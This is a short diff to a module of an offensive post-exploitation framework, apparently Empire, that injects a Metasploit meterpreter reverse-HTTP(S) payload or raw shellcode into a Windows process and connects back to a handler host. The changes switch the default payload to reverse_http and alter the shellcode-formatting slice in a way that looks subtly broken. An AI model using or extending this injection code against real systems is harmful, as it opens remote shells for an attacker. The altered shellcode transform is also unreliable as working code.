@@ -61,7 +61,7 @@ class Module(object):
             'Payload' : {
                 'Description'   :   'Metasploit payload to inject (reverse_http[s]).',
                 'Required'      :   False,
-                'Value'         :   'reverse_https'
+                'Value'         :   'reverse_http'
             },
             'Lhost' : {
                 'Description'   :   'Local host handler for the meterpreter shell.',
@@ -136,12 +136,12 @@ class Module(object):
         for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "listener":
                 if values['Value'] and values['Value'] != '':
-                    if option.lower() == "payload":
+                    if option.lower() == "payload" :
                         payload = "windows/meterpreter/" + str(values['Value'])
                         scriptEnd += " -" + str(option) + " " + payload
                     elif option.lower() == "shellcode":
                         # transform the shellcode to the correct format
-                        sc = ",0".join(values['Value'].split("\\"))[1:]
+                        sc = ",0".join(values['Value'].split("\\"))[0:]
                         scriptEnd += " -" + str(option) + " @(" + sc + ")"
                     else: 
                         scriptEnd += " -" + str(option) + " " + str(values['Value'])
